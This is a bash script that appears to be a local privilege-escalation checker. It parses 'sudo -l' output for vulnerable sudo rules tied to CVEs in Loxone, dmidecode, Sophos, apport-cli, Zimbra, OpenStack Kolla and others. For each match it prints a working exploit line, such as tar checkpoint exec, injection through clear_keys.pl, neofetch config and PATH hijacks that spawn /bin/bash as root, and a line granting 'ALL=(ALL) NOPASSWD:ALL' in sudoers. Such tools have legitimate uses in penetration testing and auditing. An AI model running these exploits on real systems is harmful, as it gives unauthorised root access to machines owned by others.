#!/bin/bash

##### (Cosmetic) Colour output
RED="\033[01;31m"      # Issues/Errors
GREEN="\033[01;32m"    # Success
YELLOW="\033[01;33m"   # Warnings/Information
BLUE="\033[01;34m"     # Heading
BOLD="\033[01;01m"     # Highlight
RESET="\033[00m"       # Normal

# Function to compare two version strings
compare_versions() {
    local cvers=$1
    local vvers=$2
    local appname=$3

    IFS='.' read -ra cversion <<< "$cvers"
    IFS='.' read -ra vversion <<< "$vvers"

    local len1=${#cversion[@]}
    local len2=${#vversion[@]}
    local max_len=$(( len1 > len2 ? len1 : len2 ))

    for ((i = 0; i < max_len; i++)); do
        local num1=0
        local num2=0

        if [ $i -lt $len1 ]; then
            num1=${cversion[i]}
        fi

        if [ $i -lt $len2 ]; then
            num2=${vversion[i]}
        fi

        if [ $num1 -gt $num2 ]; then
            #echo "$cvers is greater than $vvers"
            echo -e "[-] $appname current version $cvers [vulnerable version < $vvers] - NOT Vulnerable"
            return 0
        elif [ $num1 -lt $num2 ]; then
             echo -e "[-] $appname current version $cvers [vulnerable version < $vvers] - ${BOLD}${RED}VULNERABLE${RESET}"
            return 1
        fi
    done

    echo "current version [$cvers] is equal to vulnerable version [$vvers], if it is inclusive then it is VULNERABLE!"
    return 2
}

 cmd=$(sudo -l -k)


 echo -e "${BOLD}${BLUE} ====== [A] 3rdParty App/Device (CVEs) ====== ${RESET} \n"


## ------------------------------

# CVE-2023-36624 - Loxone Miniserver Go Gen.2 

check1=$(echo "$cmd" 2>/dev/null | grep -i "starthomekit.service")
check2=$(echo "$cmd" 2>/dev/null | grep -i "miniserverinit applytzdata")
check3=$(echo "$cmd" 2>/dev/null | grep -i "$(which tar) \*")

if [ -n "$check1" ] && [ -n "$check2" ] && [ -n "$check3" ]; then
  
    echo -e "${BOLD}${RED}[-] Vulnerable to CVE-2023-36624${RESET}"
    echo -e "${BOLD}${GREEN}[+] Loxone Miniserver Go Gen.2 allows an authenticated OS user to escalate privileges via the Sudo configuration. ${RESET}"    
    echo -e "[-] Loxone - Miniserver Go Gen.2 [Vulnerable version: <14.0.3.28]"
    echo -e "[*] Notes: CVE/3rdPartyDevices/CVE-2023-36624.txt"
    echo -e "[*] Exploit: sudo $(which tar) -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=\"whoami;id\""
    echo -e "\n"

fi

# ------------------------------------------------------

# CVE-2023-32696 - CKAN

check1=$(cat /etc/passwd | cut -d ":" -f 1 | grep -iw "ckan")
check2=$(groups ckan | grep -i sudo)
check3=$(ls -al /srv/app/start_ckan_development.sh 2>/dev/null)

if [ -n "$check1" ] && [ -n "$check2" ] && [ -n "$check3" ]; then
  
    echo -e "${BOLD}${RED}[-] Vulnerable to CVE-2023-32696 [Execessive perms] ${RESET}"
    echo -e "${BOLD}${GREEN}[+] CKAN is an open-source data management system for powering data hubs and data portals. "
    echo -e "The ckan user (equivalent to www-data) owned code and configuration files in the docker container and the ckan user had the permissions to use sudo."
    echo -e "These issues allowed for code execution or privilege escalation if an arbitrary file write bug was available. ${RESET}"    
    echo -e "[-] CKAN  [Vulnerable version: < 2.9.9 and 2.10.1]"
    echo -e "[*] Notes: CVE/3rdPartyApps/CVE-2023-32696.txt"
    echo -e "\n"

fi

# ------------------------------------------------------

# CVE-2023-30630 - dmidecode

check1=`/usr/sbin/dmidecode -V`
check2=`echo "$cmd" 2>/dev/null | grep -i "dmidecode" | grep -i "(ALL\|(root"`
chk3=`compare_versions "$cversion" "$vversion" "Dmidecode"`
check3=`echo $chk3 | grep -v "NOT"`

dmidecode_version=`/usr/sbin/dmidecode -V`

cversion=$dmidecode_version
vversion="3.5"

if [ -n "$check1" ] && [ -n "$check2" ] && [ -n "$check3" ]; then
  
    echo -e "${BOLD}${RED}[-] Vulnerable to CVE-2023-30630${RESET}"
    echo -e "${BOLD}${GREEN}[+] Dmidecode allows -dump-bin to overwrite a local file. This has security relevance because, for example, execution of Dmidecode via Sudo is plausible. ${RESET}"    
     echo -e "[-] $(echo "$cmd" | grep -i 'dmidecode' | sed 's/^ //g')"
    compare_versions "$cversion" "$vversion" "Dmidecode"
    echo -e "[*] Notes: CVE/3rdPartyApps/CVE-2023-30630.txt"
    echo -e "${BOLD}${RED}[-] IMPORTANT: This vulnerability overwrite existing file, issue might occur on production system. A backup should be done prior to exploitation.${RESET}"
    echo -e "[-] For privilege escalation, the steps below can followed to limit the risk. The exploit will set the current user uid to 0 on /etc/passwd"
    echo -e "[*] Exploit: CVE/3rdPartyApps/CVE-2023-32696/exploit.sh"
    echo -e "[*] After successfully running the script, you may need to log again with the current user depending on OS flavor/version, you should have uid=0 when you run command id"
    echo -e "[-] The /etc/passwd backup is stored here : CVE/3rdPartyApps/CVE-2023-32696/passwd.backup"
    echo -e "[*] Exploit: CVE/3rdPartyApps/CVE-2023-32696/restore.sh"
    echo -e "\n"

fi

# ------------------------------------------------------

# CVE-2023-26604 - systemd
check1=`which systemd`
check2=`systemd --version 2>/dev/null | awk 'NR==1{print $2}'`
check3=`echo "$cmd" 2>/dev/null | grep -i "systemctl status"`

if [ -n "$check1" ] && [ -n "$check3" ] ; then
     if (( check2 < 247 )); then
     #if ((check2 < "247")) then
       echo -e "${BOLD}${RED}[-] Vulnerable to CVE-2013-4984${RESET}"
       echo -e "${BOLD}${GREEN}[+] systemd version less than 247 does not adequately block local privilege escalation for some Sudo configurations. ${RESET}" 
       echo -e "[-] systemd current $check2 [Vulnerable version: < 247]" 
       echo -e "[-] plausible sudoers files in which the "systemctl status" command may be executed. Specifically, systemd does not set LESSSECURE to 1, "
       echo -e "[-] and thus other programs may be launched from the less program. This presents a substantial security risk when running systemctl from Sudo,"
       echo -e "[-] because less executes as root when the terminal size is too small to show the complete systemctl output."
       echo -e "[*] Notes: CVE/3rdPartyApps/CVE-2023-26604.txt \n"
     fi
fi

# ------------------------------------------------------

# CVE-2013-4984 - Sophos Web Appliance

check1=`echo "$cmd" 2>/dev/null | grep -i "sophox"`
check2=`echo "$cmd" 2>/dev/null | grep -i "sophox-register"`
check3=`echo "$cmd" 2>/dev/null | grep -i "sophox-remote-assist"`
check4=`echo "$cmd" 2>/dev/null | grep -i "clear_keys.pl"`
check5=`echo "$cmd" 2>/dev/null | grep -i "/opt/cma/bin/clear_keys.pl"`

if [ -n "$check1" ] && [ -n "$check2" ] && [ -n "$check3" ]; then
  
  if [ -n "$check4" ] || [ -n "$check5" ] ; then
    echo -e "${BOLD}${RED}[-] Vulnerable to CVE-2013-4984${RESET}"
    echo -e "${BOLD}${GREEN}[+] Sophos Web Appliance allows OS command injection with root privilege via sudo. ${RESET}"   
    echo -e "[-] $(echo $check5 | sed 's/^ //g')" 
    echo -e "[-] Sophos Web Appliance [Vulnerable version: < 3.7.9.1 and < 3.8.1.1 (other also might be) ]"
    echo -e "[-] Sudo current $sudover [Vulnerable version: < 1.8.7p2]"
    echo -e "[*] Generally the user that is allow to run the script is named spiderman"
    echo -e "[*] Notes: CVE/3rdPartyApps/CVE-2013-4984.txt"
    echo -e "[*] Exploit: sudo /opt/cma/bin/clear_keys.pl fakeclientfqdn \";/bin/bash id;\" /fakedir \n"
    #echo -e "\n"
  fi

fi


# ------------------------------------------------------

 echo -e "${BOLD}${BLUE} ====== [B] Misconfig related to specific 3rdParty App/Device ====== ${RESET} \n"
 
# neofetch
who=$(whoami)
check1=`echo "$cmd" 2>/dev/null | grep "XDG_CONFIG_HOME" | grep "env_keep"`
check2=$(ls /home/$who/.config/neofetch/config.conf 2>/dev/null)
check3=`echo "$cmd" 2>/dev/null | grep "neofetch \\\"\\\""`

if [ -n "$check1" ] && [ -n "$check2" ] && [ -n "$check3" ]; then
   cmdneo=`echo "$cmd" 2>/dev/null | grep "neofetch \\\"\\\"" | cut -d: -f 2- | sed 's/^ //g'`
   echo -e "${BOLD}${RED}[-] neofetch sudo's rule is vulnerable ${RESET}"
   echo -e "${BOLD}${GREEN}[-] neofetch is vulnerable to command injection in config file${RESET}"
    echo -e "[-] $(echo $check3 | sed 's/^ //g')"
   echo -e "[*] Exploit: export XDG_CONFIG_HOME=$check2; echo 'exec /bin/bash' >> $check2; sudo $cmdneo \n"
fi

# CVE-2023-1326 - apport-cli
check1=`echo "$cmd" 2>/dev/null | grep "apport-cli" | cut -d ":" -f 2`
if [ -n "$check1" ] ; then
  echo -e "${BOLD}${RED}[-] apport-cli is vulnerable ${RESET}"
  echo -e "${BOLD}${GREEN}[-] apport-cli is not recommended to be ran with sudo${RESET}"
  echo -e "[-] $(echo "$cmd" | grep -i 'apport-cli' | sed 's/^ //g')"
  echo -e "[*] Notes: CVE/3rdPartyApps/CVE-2023-1326.txt"
  echo -e "[*] Exploit: sudo$check1 ${BLUE}then input v in the menu and run ${RESET}!id \n"
fi


# CVE-2022-45153 - saphanabootstrap-formula 
check1=`echo "$cmd" 2>/dev/null | grep "crm_attribute"`
check2=$(which salt-call | sed 's/ //g')
check3a=$(lsb_release -a 2>/dev/null | grep -i Description | grep -i "SUSE Linux Enterprise Server for SAP Applications 15 SP1\|SUSE Linux Enterprise Server 12 SP5")
check3b=$(cat /etc/os-release | grep -i PRETTY_NAME | grep -i "openSUSE Leap 15.4")

if [ -n "$check1" ] && [ -n "$check2" ] ; then
    
    if [ -n "$check3a" ] || [ -n "$check3b" ] ; then
            #cmdneo=`echo "$cmd" 2>/dev/null | grep "neofetch \\\"\\\"" | cut -d: -f 2- | sed 's/^ //g'`
            echo -e "${BOLD}${RED}[-] saphanabootstrap-formula is vulnerable! ${RESET}"
            echo -e "${BOLD}${GREEN}[-] Escalation to root for arbitrary users in hana/ha_cluster.sls ${RESET}"
            echo -e "[-] $(echo $check1 | sed 's/^ //g')"
            echo -e "[-] Note: CVE/CVE-2022-45153/CVE-2022-45153.txt"
            echo -e "[*] Exploit: cp CVE/CVE-2022-45153/ha_cluster_exploit.sls /usr/share/salt-formulas/states/ha_cluster_exploit.sls; echo '$who ALL=(ALL) NOPASSWD:ALL' > /tmp/sudoers \n"
            echo -e "[*] We then need to wait root user to run : salt-call --local state.apply ha_cluster_exploit once done we just need to sudo su"
    fi
     
fi

# CVE-2022-37393 - Zimbra
check1=`echo "$cmd" 2>/dev/null | grep "/opt/zimbra/libexec/zmslapd"`
check2=$(cat /etc/passwd | cut -d ":" -f 1 | grep -i zimbra)
#check3=$(su - zimbra -c "zmcontrol -v" | sed -r 's/([^0-9]*)([0-9].[0-9].[0-9])(.*)/2/')
check3=$(su - zimbra -c "zmcontrol -v" 2>/dev/null | sed 's/Release//g' | cut -d . -f 1,2,3,4 | sed 's/^ //g' )
if [ -n "$check1" ] && [ -n "$check2" ] ; then

    echo -e "[-] Zimbra current version $check3 [vulnerable version including 9.0.0 P25 and 8.8.15 P32]"
    echo -e "[-] Note: CVE/CVE-2022-45153/CVE-2022-45153.txt"
    echo -e "[*] Exploit: gcc -shared -o /tmp/slapper/libhax.so CVE/CVE-2022-45153/libhax.c; gcc -o /tmp/slapper/rootslap CVE/CVE-2022-45153/rootslap.c; sudo /opt/zimbra/libexec/zmslapd -u root -g root -f CVE/CVE-2022-45153/slapd.conf; /tmp/slapper/rootslap"

fi


# CVE-2022-38060 - OpenStack Kolla 
check1=`echo "$cmd" 2>/dev/null | grep "kolla_copy_cacerts" | grep -i "setenv" | awk '{ print $NF}' | sed 's/^ //g'`
check2=`echo "$cmd" 2>/dev/null | grep -i Defaults -A 5 | grep -i "setenv"`
 
 if [ -n "$check1" ] || [ -n "$check2" ] ; then
     echo -e "${BOLD}${RED}[-] OpenStack Kolla  is vulnerable to path hijacking! ${RESET}"
     echo -e "${BOLD}${GREEN}[-] A path hijacking is possible due to using setenv and relative path to a binary in the script from sudo's rule${RESET}"
     echo -e "[-] $(echo "$cmd" | grep -i 'kolla_copy_cacerts' | sed 's/^ //g')"
     echo -e "[*] Exploit: echo '#!/bin/bash' > /tmp/update-ca-certificates;echo 'id' >> /tmp/update-ca-certificates; chmod +x /tmp/update-ca-certificates; sudo PATH=/tmp:\$PATH $check1 ; rm /tmp/update-ca-certificates\n"
 fi


# ------------------------------------------------------

echo -e "${BOLD}${BLUE} ====== [C] Misconfig related to specific programming language ====== ${RESET} \n"

# go lang
gopath=$(which go | sed 's/ //g')
check1=$(echo "$cmd" 2>/dev/null | grep "$gopath\| go ")
check2=$(echo "$cmd" 2>/dev/null | grep "\.go")

if [ -n "$check1" ] && [ -n "$check2" ] ; then
   
    goscriptpath=`echo "$cmd" 2>/dev/null | grep .go | cut -d: -f 2 | sed 's/ /\n/g' | grep "\.go$"`
    if [ -n "$goscriptpath" ] ; then
        for gospath in $goscriptpath; do        
            # if /bin/bash or /bin/sh then check if second argument has /
            bashrelpath=$(cat "$gospath"| grep exec.Command | cut -d "(" -f 2 | cut -d ")" -f 1 | grep "bin/*sh" | awk '{ print $2 }' | grep -v "\/" | sed 's/"//g')
             if [ -n "$bashrelpath" ] ; then
             echo -e "${BOLD}${RED}[+] A go script can be run as sudo which in turn run a bash script with relative path.${RESET}"
             echo -e "${BOLD}${GREEN}[-] Creating a script with the same name in the current directory can be used for privilege escalation.${RESET}"
             echo -e "[-] $(echo $check1 | sed 's/^ //g')"
             echo -e "[*] Exploit: cd /tmp; echo '#!/bin/bash' > /tmp/$bashrelpath;echo 'id' >> /tmp/$bashrelpath; chmod +x /tmp/$bashrelpath;sudo $(echo $check1 | cut -d: -f2 | sed 's/^ //g'); rm /tmp/$bashrelpath"
             echo -e "\n"
             fi
        done
    fi
    
fi

# ------------------------------------------------------

